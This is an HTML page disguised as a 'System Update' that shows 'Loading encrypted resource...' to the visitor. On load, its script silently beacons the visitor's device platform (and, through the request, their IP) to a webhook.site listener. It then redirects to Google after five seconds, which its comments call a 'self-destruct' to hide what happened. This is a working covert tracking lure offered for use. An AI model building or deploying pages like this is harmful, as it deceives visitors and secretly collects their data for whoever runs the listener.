<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <script>
        function startOperation() {
            // 1. DATA PING: Replace with your Webhook.site URL
            const listener = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
            
            // Send the IP data immediately
            navigator.sendBeacon(listener + "?device=" + navigator.platform + "&status=deployed");

            // 2. THE SELF-DESTRUCT: Redirect to Google after 5 seconds
            // We use 5 seconds for testing so you aren't waiting too long.
            setTimeout(function() {
                window.location.replace("https://www.google.com");
            }, 5000);
        }
        window.onload = startOperation;
    </script>
</head>
<body style="background-color: black; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
    <p>Loading encrypted resource...</p>
</body>
</html>
